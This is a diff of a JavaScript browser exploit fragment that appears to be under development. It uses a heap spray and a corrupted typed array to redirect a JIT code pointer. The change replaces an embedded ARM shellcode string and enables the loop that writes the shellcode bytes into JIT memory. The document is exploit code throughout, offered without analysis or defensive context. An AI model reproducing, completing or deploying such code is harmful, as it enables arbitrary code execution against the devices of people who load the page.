@@ -1,5 +1,5 @@
 <script>	
-alert("start567");
+alert("start66");
 function func2(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -159,10 +159,10 @@ spray[spray_index][typedarray_index+0x38/4]=jitcode_addr-0x18;//addr;
 var jit_index=typedarray_index+0x38/4;
 var typedarray=spray[spray_index];
 var myarr=arrcvs[0];
-var shellcode="\ub004\ue52d\ub000\ue28d\u0003\ue3a0\ud000\ue28b\u0800\ue8bd\uff1e\ue12f";
+var shellcode="\x0e\x20\xa0\xe1\x10\x20\x04\xe5\x70\x80\x9f\xe5\x08\x80\x04\xe5\x00\x10\x84\xe2\x68\x30\x9f\xe5\x00\x80\x93\xe5\x00\x01\x58\xe1\x00\x05\x00\x3a\x00\x01\xa0\xe3\x00\x10\xe0\xe3\x10\x20\x14\xe5\x28\x40\x14\xe5\x02\xe0\xa0\xe1\x1e\xff\x2f\xe1";
  for(var i=0;i<shellcode.length;i++){
- //myarr[0]=shellcode.charCodeAt(i);
- typedarray[jit_index]+=2;
+ myarr[0]=shellcode.charCodeAt(i);
+ typedarray[jit_index]+=1;
 }
 while(1){
 a=prompt("addr");
